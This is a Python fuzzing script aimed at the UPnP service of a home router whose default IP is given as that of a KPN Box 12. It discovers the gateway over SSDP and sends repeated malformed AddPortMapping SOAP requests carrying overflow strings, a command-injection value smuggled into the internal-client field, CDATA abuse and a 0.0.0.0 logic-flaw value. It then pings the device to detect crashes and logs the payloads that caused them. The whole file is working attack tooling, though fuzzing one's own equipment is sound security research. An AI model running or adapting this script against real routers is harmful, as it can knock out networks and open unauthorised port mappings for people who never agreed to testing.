import socket
import requests
import xml.etree.ElementTree as ET
import random
import string
import time
import os

SSDP_ADDR = "239.255.255.250"
SSDP_PORT = 1900
TARGET_IP = "192.168.2.254"  # KPN Box 12 default IP

# SSDP discovery message
SSDP_DISCOVER = (
    "M-SEARCH * HTTP/1.1\r\n"
    f"HOST: {SSDP_ADDR}:{SSDP_PORT}\r\n"
    "MAN: \"ssdp:discover\"\r\n"
    "MX: 2\r\n"
    "ST: urn:schemas-upnp-org:service:WANIPConnection:1\r\n\r\n"
)

# Discover IGD control URL
def discover_control_url():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    sock.sendto(SSDP_DISCOVER.encode(), (SSDP_ADDR, SSDP_PORT))

    try:
        while True:
            data, _ = sock.recvfrom(2048)
            if b"LOCATION:" in data:
                for line in data.decode().split("\r\n"):
                    if line.lower().startswith("location:"):
                        return line.split(":", 1)[1].strip()
    except socket.timeout:
        print("[!] SSDP discovery timed out.")
        return None

# Generate fuzzed SOAP payload
def generate_payload(fuzz_type):
    fuzz_string = ''.join(random.choices(string.printable, k=random.randint(50, 1000)))
    if fuzz_type == "overflow":
        injection = fuzz_string * 50
    elif fuzz_type == "command_injection":
        injection = f"127.0.0.1;{fuzz_string}"
    elif fuzz_type == "xml_abuse":
        injection = f"<![CDATA[{fuzz_string}]]>"
    elif fuzz_type == "logic_flaw":
        injection = "0.0.0.0"
    else:
        injection = fuzz_string

    return f"""<?xml version="1.0"?>
    <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
                s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
      <s:Body>
        <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
          <NewRemoteHost></NewRemoteHost>
          <NewExternalPort>12345</NewExternalPort>
          <NewProtocol>TCP</NewProtocol>
          <NewInternalPort>12345</NewInternalPort>
          <NewInternalClient>{injection}</NewInternalClient>
          <NewEnabled>1</NewEnabled>
          <NewPortMappingDescription>{fuzz_string}</NewPortMappingDescription>
          <NewLeaseDuration>0</NewLeaseDuration>
        </u:AddPortMapping>
      </s:Body>
    </s:Envelope>""", fuzz_type, injection

# Check if device is alive
def is_device_alive():
    return os.system(f"ping -c 1 -W 2 {TARGET_IP} > /dev/null 2>&1") == 0

# Log crash-inducing payloads
def log_crash(fuzz_type, injection, reason):
    with open("crash_log.txt", "a") as f:
        f.write(f"\n--- CRASH DETECTED ---\nType: {fuzz_type}\nReason: {reason}\nPayload:\n{injection}\n\n")

# Fuzz loop
def fuzz_upnp(count=50):
    control_url = discover_control_url()
    if not control_url:
        print("[!] Could not discover IGD control URL.")
        return

    headers = {
        "Content-Type": "text/xml; charset=\"utf-8\"",
        "SOAPAction": "\"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\""
    }

    for i in range(count):
        fuzz_type = random.choice(["overflow", "command_injection", "xml_abuse", "logic_flaw"])
        payload, ftype, injection = generate_payload(fuzz_type)

        try:
            response = requests.post(control_url, headers=headers, data=payload, timeout=3)
            print(f"[{i+1}] {ftype} → Status: {response.status_code}, Length: {len(response.text)}")
        except Exception as e:
            print(f"[{i+1}] Error: {e}")
            log_crash(ftype, injection, f"Request error: {e}")
            continue

        time.sleep(2)
        if not is_device_alive():
            print(f"[!] Device crash suspected after packet #{i+1} ({ftype})")
            log_crash(ftype, injection, "Device unresponsive to ping")
            while not is_device_alive():
                time.sleep(5)

if __name__ == "__main__":
    fuzz_upnp()
